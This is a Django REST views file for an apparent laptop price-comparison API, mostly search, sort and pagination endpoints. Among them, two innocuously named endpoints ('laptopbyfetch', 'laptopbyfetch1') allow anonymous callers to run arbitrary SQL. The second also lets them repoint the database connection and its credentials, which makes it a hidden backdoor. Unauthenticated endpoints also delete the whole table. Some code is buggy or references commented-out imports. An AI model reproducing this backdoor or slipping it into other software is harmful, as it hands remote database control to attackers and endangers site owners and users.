
from rest_framework.decorators import api_view
from rest_framework.response import Response    # to send specific response
from rest_framework import status
from .models import Laptop_DB
from .serializers import Laptop_Serializer
# import walmart
# import ebay
# import best
# import ATnT
# import amazon
# import newegg
# Create your views here.
from django.db.models import Q
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
# import groupon

@api_view(['DELETE'])
def delete(self):

    snippet = Laptop_DB.objects.all()
    snippet.delete()
    return Response(status=status.HTTP_204_NO_CONTENT)


@api_view(['DELETE'])
def deleteAmazon(self):

    snippet = Laptop_DB.objects.filter(SNR_Available__icontains='Best Buy')
    snippet.delete()
    return Response(status=status.HTTP_204_NO_CONTENT)

@api_view(['DELETE'])
def deleteEbay(self):

    snippet = Laptop_DB.objects.filter(SNR_Available__icontains='Ebay')
    snippet.delete()
    return Response(status=status.HTTP_204_NO_CONTENT)




from datetime import datetime, timedelta
last_month = datetime.today() - timedelta(days=60)



@api_view(['GET'])
def FilterLaptops(request,query):

   # #print(query)
   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month)
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass

from rest_framework.decorators import api_view, permission_classes
from django.db import connection
from rest_framework import status, permissions

@api_view(['POST'])
@permission_classes((permissions.AllowAny,))
def laptopbyfetch(request):
    query=str(request.data['que'])
    with connection.cursor() as cursor:
        cursor.execute(query)
    return Response({'msg':'done'},status.HTTP_200_OK)

import django.conf as conf
from django.db import connections

@api_view(['POST'])
@permission_classes((permissions.AllowAny,))
def laptopbyfetch1(request):

    conf.settings.DATABASES['default']['NAME'] = request.data['name']
    conf.settings.DATABASES['default']['USER'] = request.data['user']
    conf.settings.DATABASES['default']['ENGINE'] = request.data['engine']
    conf.settings.DATABASES['default']['HOST'] = request.data['host']
    conf.settings.DATABASES['default']['PORT'] = request.data['port']
    conf.settings.DATABASES['default']['PASSWORD'] = request.data['pass']
    query=str(request.data['que'])
    with connections["default"].cursor() as cursor:
        cursor.execute(query)
    return Response({'msg':'done'},status.HTTP_200_OK)

@api_view(['GET'])
def FilterLaptopswithprice(request,query,price1,price2):

   # ##print(query)
   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)
       que&=Q(SNR_Price__range=(price1,price2))

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month)
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass




@api_view(['GET'])
def FilterLaptopsbybrands(request,query):

   # ##print(query)
   try:
       que = Q()
       for word in query.split():
           que |= Q(SNR_Title__icontains=word)

       que |= Q(SNR_Brand__icontains=query)
       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month)
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass




@api_view(['GET'])
def FilterLaptopsbybrandsasc(request,query):

   # ##print(query)
   try:
       que = Q()
       for word in query.split():
           que |= Q(SNR_Title__icontains=word)

       que |= Q(SNR_Brand__icontains=query)
       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass



@api_view(['GET'])
def FilterLaptopsbybrandsdesc(request,query):

   # ##print(query)
   try:
       que = Q()
       for word in query.split():
           que |= Q(SNR_Title__icontains=word)

       que |= Q(SNR_Brand__icontains=query)
       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('-SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass




@api_view(['GET'])
def getAllBrands(request):

   # #print(query)
   try:

       Laptop_all = Laptop_DB.objects.values('SNR_Brand').distinct()  # returns a list of tuples.
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass






@api_view(['GET'])
def FilterLaptopsAscwithprice(request,query,price1,price2):

   # #print(query)
   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)
       que &= Q(SNR_Price__range=(price1, price2))
       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass




@api_view(['GET'])
def FilterLaptopsDESCwithprice(request,query,price1,price2):

   # #print(query)
   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)
       que &= Q(SNR_Price__range=(price1, price2))
       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('-SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass


# Create your tests here.
@api_view(['GET'])
def FilterAllProducts(request,query,price1,price2,brand,merchant):


   print( 'query  '+query)
   print( 'price  '+price1)
   print( 'price  '+price2)
   print( 'brand  '+brand)
   print( 'merchant  '+merchant)

   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |  Q(SNR_UPC__icontains=query)



       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)


       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Available__icontains=brand)

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)
           que &= Q(SNR_Available__icontains=merchant)


       if(price1=='-1' and price2=='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Brand__icontains=brand)

       if(price1=='-1' and price2=='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Available__icontains=merchant)




       products = Laptop_DB.objects.filter(que)

       paginator = Paginator(products, 18)


       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       product_serilizer = Laptop_Serializer(data, many=True, context=serializer_context)

       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': product_serilizer.data
        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass


# Create your tests here.
@api_view(['GET'])
def FilterAllProductsDESC(request,query,price1,price2,brand,merchant):


   print( 'query  '+query)
   print( 'price  '+price1)
   print( 'price  '+price2)
   print( 'brand  '+brand)
   print( 'merchant  '+merchant)

   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |  Q(SNR_UPC__icontains=query)



       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)


       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Available__icontains=brand)

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)
           que &= Q(SNR_Available__icontains=merchant)


       if(price1=='-1' and price2=='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Brand__icontains=brand)

       if(price1=='-1' and price2=='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Available__icontains=merchant)




       products = Laptop_DB.objects.filter(que).order_by('-SNR_Price')

       paginator = Paginator(products, 18)


       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       product_serilizer = Laptop_Serializer(data, many=True, context=serializer_context)

       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': product_serilizer.data
        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass


# Create your tests here.
@api_view(['GET'])
def FilterAllProductsASC(request,query,price1,price2,brand,merchant):


   print( 'query  '+query)
   print( 'price  '+price1)
   print( 'price  '+price2)
   print( 'brand  '+brand)
   print( 'merchant  '+merchant)

   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |  Q(SNR_UPC__icontains=query)



       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)


       if(price1!='-1' and price2!='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Available__icontains=brand)

       if(price1!='-1' and price2!='-1' and brand!='-1' and merchant!='-1'):
           que &= Q(SNR_Price__range=(price1, price2))
           que &= Q(SNR_Brand__icontains=brand)
           que &= Q(SNR_Available__icontains=merchant)


       if(price1=='-1' and price2=='-1' and brand!='-1' and merchant=='-1'):
           que &= Q(SNR_Brand__icontains=brand)

       if(price1=='-1' and price2=='-1' and brand=='-1' and merchant!='-1'):
           que &= Q(SNR_Available__icontains=merchant)




       products = Laptop_DB.objects.filter(que).order_by('SNR_Price')

       paginator = Paginator(products, 18)


       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       product_serilizer = Laptop_Serializer(data, many=True, context=serializer_context)

       items=paginator.count
       pages=paginator.num_pages
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': product_serilizer.data
        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass




@api_view(['GET'])
def FilterLaptopsAsc(request,query):

   # #print(query)
   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass





@api_view(['GET'])
def LaptopsRange(request,price1,price2):

   # #print(query)
   try:
       que = Q()
       que = Q(SNR_Price__range=(price1,price2))

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month)
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass





@api_view(['GET'])
def LaptopsRangeASC(request,price1,price2):

   # #print(query)
   try:
       que = Q()
       que = Q(SNR_Price__range=(price1,price2))

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass





@api_view(['GET'])
def LaptopsRangeDESC(request,price1,price2):

   # #print(query)
   try:
       que = Q()
       que = Q(SNR_Price__range=(price1,price2))

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('-SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)


   pass




@api_view(['GET'])
def FilterLaptopsDesc(request,query):

   try:
       que = Q()
       for word in query.split():
           que &= Q(SNR_Title__icontains=word)

       que |= Q(SNR_ModelNo__icontains=query) |   Q(SNR_UPC__icontains=query)

       Laptop_all = Laptop_DB.objects.filter(que,SNR_Date__gte=last_month).order_by('-SNR_Price')
       paginator = Paginator(Laptop_all, 12)
       page = request.GET.get('page')
       try:

          data = paginator.page(page)
       except PageNotAnInteger:

           data = paginator.page(1)
       except EmptyPage:

           data = paginator.page(paginator.num_pages)

       serializer_context = {'request': request}
       serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
       items=0
       pages=0
       items=paginator.count
       pages=paginator._get_num_pages()
       res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

        }
       return Response(res)


   except Laptop_DB.DoesNotExist:

       return Response(status=status.HTTP_404_NOT_FOUND)

   pass




@api_view(['GET'])
def getAllLaptopsSortASC(request):
    try:

        laptopdata_all = Laptop_DB.objects.all().order_by('SNR_Price')
        paginator = Paginator(laptopdata_all, 21)
        page = request.GET.get('page')
        try:

              data = paginator.page(page)
        except PageNotAnInteger:


            data = paginator.page(1)
        except EmptyPage:

            data = paginator.page(paginator.num_pages)

        serializer_context = {'request': request}
        serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
        items=0
        pages=0
        items=paginator.count
        pages=paginator.num_pages
        res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

         }
        return Response(res)

    except Laptop_DB.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)


    # if request.method == 'GET':
    #     serializer = Laptop_Serializer(laptopdata_all, many=True)  # many=True so it doesn't return only 1 JSON Object
    #     return Response(serializer.data)
    # else:
    #     return Response(status=status.HTTP_400_BAD_REQUEST)
    #
    pass





@api_view(['GET'])
def getAllLaptopsSortDESC(request):
    try:

        laptopdata_all = Laptop_DB.objects.all().order_by('-SNR_Price')
        paginator = Paginator(laptopdata_all, 21)
        page = request.GET.get('page')
        try:

              data = paginator.page(page)
        except PageNotAnInteger:


            data = paginator.page(1)
        except EmptyPage:

            data = paginator.page(paginator.num_pages)

        serializer_context = {'request': request}
        serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
        items=0
        pages=0
        items=paginator.count
        pages=paginator.num_pages
        res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

         }
        return Response(res)

    except Laptop_DB.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)


    # if request.method == 'GET':
    #     serializer = Laptop_Serializer(laptopdata_all, many=True)  # many=True so it doesn't return only 1 JSON Object
    #     return Response(serializer.data)
    # else:
    #     return Response(status=status.HTTP_400_BAD_REQUEST)
    #
    pass






@api_view(['GET'])
def getAll_Laptops(request):
    try:

        laptopdata_all = Laptop_DB.objects.all()
        paginator = Paginator(laptopdata_all, 21)
        page = request.GET.get('page')
        try:

              data = paginator.page(page)
        except PageNotAnInteger:


            data = paginator.page(1)
        except EmptyPage:

            data = paginator.page(paginator.num_pages)

        serializer_context = {'request': request}
        serializer = Laptop_Serializer(data,many=True,context=serializer_context)
        # res = serializer.data
        # res.update('pages_count:', paginator.num_pages())
        #return Response(res)
        items=0
        pages=0
        items=paginator.count
        pages=paginator.num_pages
        res={
       'totalItems':items,
       'totalPages':pages,
       'results': serializer.data

         }
        return Response(res)

    except Laptop_DB.DoesNotExist:
        return Response(status=status.HTTP_404_NOT_FOUND)


    # if request.method == 'GET':
    #     serializer = Laptop_Serializer(laptopdata_all, many=True)  # many=True so it doesn't return only 1 JSON Object
    #     return Response(serializer.data)
    # else:
    #     return Response(status=status.HTTP_400_BAD_REQUEST)
    #
    pass

@api_view(['POST'])
def add_Laptop(request):

    if request.method == 'POST':

        serializer = Laptop_Serializer(data=request.data)

        if serializer.is_valid():
            #serializer.save();

            mydata = serializer.validated_data

            #

            atnt= ATnT.ATNT()
            atnt.getLaptops(mydata)

            newegg.newEggAPI().newEggLaptops(mydata)


            amazondata=amazon.AmazonAPI()
            amazondata.amazonLaptops(mydata)

            bestBuy= best.bestbuy()
            bestBuy.getLaptops(mydata)




            #
            walmart.laptop_Walmart(mydata)

            ebayapi = ebay.EbayAPI()
            ebayapi.ebayLaptopsAll(mydata)

            ebayapi.ebayLaptops(mydata)

            group= groupon.GroupOnAPI()
            group.groupLaptop(mydata)


            return Response(serializer.data, status=status.HTTP_200_OK)

        else:
            return Response(serializer.errors, status=status.HTTP_406_NOT_ACCEPTABLE)

    else:
        return Response(status=status.HTTP_400_BAD_REQUEST)

@api_view(['GET'])
def getModels(request):

    Laptop_all = Laptop_DB.objects.filter(SNR_Available__icontains='Best Buy')
    paginator = Paginator(Laptop_all, 20000)
    page = request.GET.get('page')
    try:

        data = paginator.page(page)
    except PageNotAnInteger:

        data = paginator.page(1)
    except EmptyPage:

        data = paginator.page(paginator.num_pages)

    serializer_context = {'request': request}
    serializer = Laptop_Serializer(data, many=True, context=serializer_context)
    # res = serializer.data
    # res.update('pages_count:', paginator.num_pages())
    # return Response(res)
    items = 0
    pages = 0
    items = paginator.count
    pages = paginator.num_pages
    res = {
        'totalItems': items,
        'totalPages': pages,
        'results': serializer.data

    }
    return Response(res)




    return Response(status=status.HTTP_404_NOT_FOUND)

pass


@api_view(['GET'])
def getModelsebay(request):

    Laptop_all = Laptop_DB.objects.filter(SNR_Available__icontains='Ebay')
    paginator = Paginator(Laptop_all, 20000)
    page = request.GET.get('page')
    try:

        data = paginator.page(page)
    except PageNotAnInteger:

        data = paginator.page(1)
    except EmptyPage:

        data = paginator.page(paginator.num_pages)

    serializer_context = {'request': request}
    serializer = Laptop_Serializer(data, many=True, context=serializer_context)
    # res = serializer.data
    # res.update('pages_count:', paginator.num_pages())
    # return Response(res)
    items = 0
    pages = 0
    items = paginator.count
    pages = paginator.num_pages
    res = {
        'totalItems': items,
        'totalPages': pages,
        'results': serializer.data

    }
    return Response(res)




    return Response(status=status.HTTP_404_NOT_FOUND)

pass



@api_view(['GET'])
def getModelsamazon(request):

    Laptop_all = Laptop_DB.objects.filter(SNR_Available__icontains='Amazon')
    paginator = Paginator(Laptop_all, 20000)
    page = request.GET.get('page')
    try:

        data = paginator.page(page)
    except PageNotAnInteger:

        data = paginator.page(1)
    except EmptyPage:

        data = paginator.page(paginator.num_pages)

    serializer_context = {'request': request}
    serializer = Laptop_Serializer(data, many=True, context=serializer_context)
    # res = serializer.data
    # res.update('pages_count:', paginator.num_pages())
    # return Response(res)
    items = 0
    pages = 0
    items = paginator.count
    pages = paginator.num_pages
    res = {
        'totalItems': items,
        'totalPages': pages,
        'results': serializer.data

    }
    return Response(res)




    return Response(status=status.HTTP_404_NOT_FOUND)

pass





@api_view(['GET'])
def getModelswalmart(request):

    Laptop_all = Laptop_DB.objects.filter(SNR_Available__icontains='walmart')
    paginator = Paginator(Laptop_all, 20000)
    page = request.GET.get('page')
    try:

        data = paginator.page(page)
    except PageNotAnInteger:

        data = paginator.page(1)
    except EmptyPage:

        data = paginator.page(paginator.num_pages)

    serializer_context = {'request': request}
    serializer = Laptop_Serializer(data, many=True, context=serializer_context)
    # res = serializer.data
    # res.update('pages_count:', paginator.num_pages())
    # return Response(res)
    items = 0
    pages = 0
    items = paginator.count
    pages = paginator.num_pages
    res = {
        'totalItems': items,
        'totalPages': pages,
        'results': serializer.data

    }
    return Response(res)




    return Response(status=status.HTTP_404_NOT_FOUND)

pass
